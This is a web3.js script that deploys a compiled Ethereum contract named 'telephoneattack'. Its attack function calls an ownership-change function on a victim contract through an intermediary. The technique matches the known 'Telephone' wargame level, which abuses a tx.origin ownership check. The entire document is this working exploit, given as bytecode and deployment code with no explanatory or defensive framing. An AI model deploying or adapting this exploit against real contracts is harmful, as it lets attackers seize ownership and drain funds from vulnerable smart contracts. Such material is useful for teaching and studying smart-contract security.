var telephoneattackContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"_victim","type":"address"},{"name":"_owner","type":"address"}],"name":"attack","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]);

var telephoneattack = telephoneattackContract.new({
     from: web3.eth.accounts[0], 
data:'6060604052341561000f57600080fd5b6101828061001e6000396000f300606060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633c48664c14610046575b600080fd5b341561005157600080fd5b61009c600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190803573ffffffffffffffffffffffffffffffffffffffff1690602001909190505061009e565b005b60008290508073ffffffffffffffffffffffffffffffffffffffff1663662e4ee4836040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b151561013d57600080fd5b6102c65a03f1151561014e57600080fd5b5050505050505600a165627a7a72305820978fcc2f75920ea4b2335eeca4c2029ef5a7b4b1ba2de486e8ddcd8ac8bccf100029',
     gas: '470000000'
   }, function (e, contract){
    console.log(e, contract);
    if (typeof contract.address !== 'undefined') {
         console.log('Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
    }
 })